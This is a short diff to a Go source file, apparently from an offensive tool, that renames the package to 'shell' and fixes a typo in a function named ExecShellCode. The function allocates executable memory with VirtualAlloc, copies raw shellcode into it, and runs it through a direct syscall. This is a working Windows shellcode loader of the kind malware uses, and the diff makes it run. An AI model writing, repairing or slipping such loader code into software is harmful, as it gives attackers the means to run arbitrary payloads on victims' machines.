@@ -1,6 +1,6 @@
 // +build windows !linux !darwin !freebsd
 
-package main
+package shell
 
 import (
 	"encoding/base64"
@@ -50,8 +50,9 @@ func ExecShellCode(shellcode []byte) {
 	// Reserve space to drop shellcode
 	address, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
 	addrPtr := (*[990000]byte)(unsafe.Pointer(address))
+	// Copy shellcode
 	for i, value := range shellcode {
-		addPtr[i] = value
+		addrPtr[i] = value
 	}
 
 	go syscall.Syscall(address, 0, 0, 0, 0)
